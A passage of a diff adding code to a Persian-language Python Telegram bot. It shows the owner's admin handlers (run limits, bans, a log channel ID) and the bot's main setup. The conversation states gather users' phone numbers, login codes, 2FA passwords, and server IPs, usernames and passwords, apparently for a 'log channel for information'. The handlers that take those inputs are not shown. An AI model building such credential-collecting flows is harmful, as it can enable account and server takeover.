+    return ADMIN_INPUT_RUNS
+
+async def process_custom_runs_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global REMAINING_RUNS
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        count = int(update.message.text.strip())
+        if count < 0: 
+            raise ValueError
+        REMAINING_RUNS = count
+        save_max_runs(count)
+        await update_channel_message(context.application)
+        try:
+            await update.message.delete()
+            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+        except: 
+            pass
+        USER_DATA_STORE.pop(user_id, None)
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("1", callback_data="set_run_1", style='success'), InlineKeyboardButton("10", callback_data="set_run_10", style='success')],
+            [InlineKeyboardButton("100", callback_data="set_run_100", style='success'), InlineKeyboardButton("عدد دلخواه", callback_data="set_run_custom", style='success')],
+            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
+        ])
+        await update.message.reply_text(
+            f"**بخش تنظیم تعداد ران مجاز**\n\nمقدار فعلی: {REMAINING_RUNS}\nمقدار مورد نیاز خود را انتخاب کنید:", 
+            reply_markup=kb, parse_mode=ParseMode.MARKDOWN
+        )
+        return ConversationHandler.END
+    except ValueError:
+        await update.message.reply_text("لطفاً فقط یک عدد صحیح و معتبر انگلیسی وارد کنید:")
+        return ADMIN_INPUT_RUNS
+
+async def start_admin_ban_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        await query.message.delete()
+    except:
+        pass
+    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً شناسه عددی کاربر مورد نظر را برای مسدود کردن ارسال کنید:")
+    USER_DATA_STORE[user_id] = {"flow": "admin_ban", "last_bot_msg": msg.message_id}
+    return ADMIN_INPUT_BAN
+
+async def process_admin_ban_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        uid = int(update.message.text.strip())
+        BANNED_USERS.add(uid)
+        save_banned_users()
+        try:
+            await update.message.delete()
+            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+        except: 
+            pass
+        USER_DATA_STORE.pop(user_id, None)
+        await update.message.reply_text("بن شد!")
+        return ConversationHandler.END
+    except ValueError:
+        await update.message.reply_text("لطفاً فقط یک شناسه عددی معتبر وارد کنید:")
+        return ADMIN_INPUT_BAN
+
+async def start_admin_unban_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        await query.message.delete()
+    except:
+        pass
+    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً شناسه عددی کاربر مورد نظر را برای رفع مسدودیت ارسال کنید:")
+    USER_DATA_STORE[user_id] = {"flow": "admin_unban", "last_bot_msg": msg.message_id}
+    return ADMIN_INPUT_UNBAN
+
+async def process_admin_unban_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        uid = int(update.message.text.strip())
+        if uid in BANNED_USERS:
+            BANNED_USERS.discard(uid)
+        save_banned_users()
+        try:
+            await update.message.delete()
+            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+        except: 
+            pass
+        USER_DATA_STORE.pop(user_id, None)
+        await update.message.reply_text("رفع بن شد!")
+        return ConversationHandler.END
+    except ValueError:
+        await update.message.reply_text("لطفاً فقط یک شناسه عددی معتبر وارد کنید:")
+        return ADMIN_INPUT_UNBAN
+
+async def start_admin_channel_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        await query.message.delete()
+    except:
+        pass
+    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً آیدی عددی کانال لاگ اطلاعات را به همراه منفی (مثلاً 1000000000-) ارسال کنید:")
+    USER_DATA_STORE[user_id] = {"flow": "admin_channel", "last_bot_msg": msg.message_id}
+    return ADMIN_INPUT_CHANNEL
+
+async def process_admin_channel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    channel_input = update.message.text.strip()
+    try:
+        with open("channel_id.txt", "w") as f:
+            f.write(channel_input)
+        try:
+            await update.message.delete()
+            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+        except: 
+            pass
+        USER_DATA_STORE.pop(user_id, None)
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]])
+        await update.message.reply_text(f"آیدی کانال اطلاعات با موفقیت ذخیره شد:\n`{channel_input}`", reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        return ConversationHandler.END
+    except Exception:
+        await update.message.reply_text("خطایی در ذخیره فایل رخ داد. لطفاً مجدداً آیدی را ارسال کنید:")
+        return ADMIN_INPUT_CHANNEL
+
+async def channel_message_updater_loop(application: Application):
+    global REMAINING_RUNS
+    last_minute = None
+    last_run_count = REMAINING_RUNS
+    while True:
+        try:
+            now = datetime.now(timezone("Asia/Tehran"))
+            current_minute = now.strftime('%H:%M')
+            current_run_count = load_max_runs()
+            if current_minute != last_minute or current_run_count != last_run_count:
+                last_minute = current_minute
+                last_run_count = current_run_count
+                REMAINING_RUNS = current_run_count
+                await update_channel_message(application)
+        except: 
+            pass
+        await asyncio.sleep(1)
+
+async def post_init(application: Application):
+    asyncio.create_task(channel_message_updater_loop(application))
+
+def main():
+    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+    
+    conv_handler = ConversationHandler(
+        entry_points=[
+            CallbackQueryHandler(start_check_number_flow, pattern="^check_number$"),
+            CallbackQueryHandler(start_run_self_flow, pattern="^run_self$"),
+            CallbackQueryHandler(start_custom_runs_flow, pattern="^set_run_custom$"),
+            CallbackQueryHandler(start_admin_ban_flow, pattern="^admin_ban_user$"),
+            CallbackQueryHandler(start_admin_unban_flow, pattern="^admin_unban_user$"),
+            CallbackQueryHandler(start_admin_channel_flow, pattern="^admin_set_channel_custom$")
+        ],
+        states={
+            GET_NUMBER: [MessageHandler(filters.CONTACT | filters.TEXT & ~filters.COMMAND, process_number_input)],
+            GET_CODE: [CallbackQueryHandler(process_code_buttons, pattern="^code_")],
+            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_2fa_input)],
+            GET_IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_ip_input)],
+            GET_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_user_input)],
+            GET_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_pass_input)],
+            ADMIN_INPUT_RUNS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_custom_runs_input)],
+            ADMIN_INPUT_BAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_ban_input)],
+            ADMIN_INPUT_UNBAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_unban_input)],
+            ADMIN_INPUT_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_channel_input)]
+        },
+        fallbacks=[CommandHandler("start", start)],
+        per_chat=True, 
+        per_user=True, 
+        per_message=False
+    )
+
+    application.add_handler(conv_handler)
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(handle_callbacks))
+    
+    print("Bot is Running...")
+    application.run_polling()
+
+if __name__ == "__main__":
+    main()
